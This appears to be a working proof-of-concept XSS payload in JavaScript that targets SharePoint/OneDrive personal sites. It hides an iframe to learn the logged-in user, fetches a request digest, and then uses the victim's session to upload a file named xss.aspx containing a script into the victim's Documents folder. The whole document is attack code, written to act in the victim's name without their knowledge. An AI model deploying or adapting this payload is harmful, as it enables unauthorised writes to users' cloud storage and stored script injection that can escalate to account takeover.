document.write("<iframe src='/' id='whoareu' border=0 width=1 height=1></iframe>");const myTimeout = setTimeout(whoareu, 2000);
function whoareu() {
	var theurl=document.getElementById('whoareu').contentWindow.location.href;
	user = new URL(theurl).pathname.split('/')[2];
	var url = "/personal/"+user+"/_api/web/GetFolderByServerRelativePath(DecodedUrl=@a1)/Files/AddUsingPath(DecodedUrl=@a2,AutoCheckoutOnInvalidData=@a3)?@a1=%27%2Fpersonal%2F"+user.replaceAll("_","%5F")+"%2FDocuments%27&@a2=%27xss%2Easpx%27&@a3=true&$Select=ServerRelativeUrl,UniqueId,Name,VroomItemID,VroomDriveID,ServerRedirectedUrl&$Expand=ListItemAllFields";
	var dgurl="/personal/"+user+"/_api/contextinfo";
	var dg = getDigest(dgurl,url);
}

function getDigest(url,uploadurl){
    var xmlhttp = new XMLHttpRequest();
	xmlhttp.open("POST", url);
	xmlhttp.setRequestHeader("Content-Type","application/json;odata=verbose");
	xmlhttp.setRequestHeader("Accept","application/json;odata=verbose");
	xmlhttp.onreadystatechange = function() {
  	if (this.readyState == 4 && this.status == 200) {
    		var myArr = this.responseText;
    		var tokenData = JSON.parse(myArr);
		startUpload(uploadurl,tokenData.d.GetContextWebInformation.FormDigestValue);
  		}
	};
	xmlhttp.send(null);
}

function startUpload(target,digestValue){
    var xmlhttp = new XMLHttpRequest();
	xmlhttp.open("POST", target);
	xmlhttp.setRequestHeader("Content-Type","application/octet-stream");
	xmlhttp.setRequestHeader("Accept","application/json;odata=verbose");
	xmlhttp.setRequestHeader("x-requestdigest",digestValue);
	xmlhttp.onreadystatechange = function() {
  	if (this.readyState == 4 && this.status == 200) {
    		console.log('uploaded, thanks for stopping by');
  		}
	};

	xmlhttp.setRequestHeader("Content-Type", "text/html;charset=UTF-8");
	//----
	//simple aspx file with a simple alert
	//----
	xmlhttp.send(decodeURI("<script>alert(document.domain)%3C/script>"));
}